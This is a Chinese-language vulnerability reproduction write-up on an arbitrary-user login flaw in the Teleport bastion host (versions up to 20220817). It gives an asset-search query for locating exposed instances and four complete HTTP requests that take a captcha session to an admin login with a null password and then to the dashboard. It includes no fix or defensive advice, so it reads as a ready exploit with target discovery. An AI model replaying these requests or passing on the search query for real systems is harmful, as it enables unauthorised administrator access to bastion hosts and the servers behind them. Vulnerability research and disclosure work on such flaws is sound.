# Teleport堡垒机 do-login 任意用户登录漏洞

# 一、漏洞简介
Teleport堡垒机是一款简单易用的开源堡垒机系统，具有小巧、易用的特点，支持RDP/SSH/SFTP/Telnet协议的远程连接和审计管理。Teleport堡垒机存在任意用户登录漏洞，攻击者通过漏洞可以获取业务后台权限。

# 二、影响版本
+ Teleport堡垒机<= 20220817  


# 三、资产测绘
+ hunter`app.name="Teleport 堡垒机系统"`
+ 特征

![1700224400227-6b4b586e-6399-4e83-8cb6-7af26e9b2218.png](./img/W8kMt7wlSfRQcUAD/1700224400227-6b4b586e-6399-4e83-8cb6-7af26e9b2218-962775.png)

# 四、漏洞复现
1. 获取验证码

```plain
GET /auth/captcha?h=36&rnd=0.39124018049760567 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: image/avif,image/webp,*/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
```

![1700224435510-cba34aea-f31f-4e71-9451-e269543ab40d.png](./img/W8kMt7wlSfRQcUAD/1700224435510-cba34aea-f31f-4e71-9451-e269543ab40d-773404.png)

2. 使用上一步的`cookie`和获取到的验证码对红框中的参数进行相应替换，校验验证码

```plain
POST /auth/verify-captcha HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12

args={"captcha":"ckpa"}
```

![1700224521182-4598afce-46ee-488a-b40a-b37cb99f9605.png](./img/W8kMt7wlSfRQcUAD/1700224521182-4598afce-46ee-488a-b40a-b37cb99f9605-298334.png)

3. 使用校验后的验证码和`cookie`对红框中的参数进行相应替换，当响应`code`为`0`时表示存在漏洞！

```plain
POST /auth/do-login HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

args={"type":2,"username":"admin","password":null,"captcha":"ckpa","oath":"","remember":false}
```

![1700224596713-4717833e-361d-45ae-9429-ebbe5555683c.png](./img/W8kMt7wlSfRQcUAD/1700224596713-4717833e-361d-45ae-9429-ebbe5555683c-262748.png)

4. 使用上一步的`cookie`对红框中的参数进行相应替换，登录系统，获取管理员权限

```plain
GET /dashboard HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
```

![1700224741128-1ec98d01-7787-4beb-8659-da182c4bd023.png](./img/W8kMt7wlSfRQcUAD/1700224741128-1ec98d01-7787-4beb-8659-da182c4bd023-330070.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/od1gvmdxp2ns8ze9>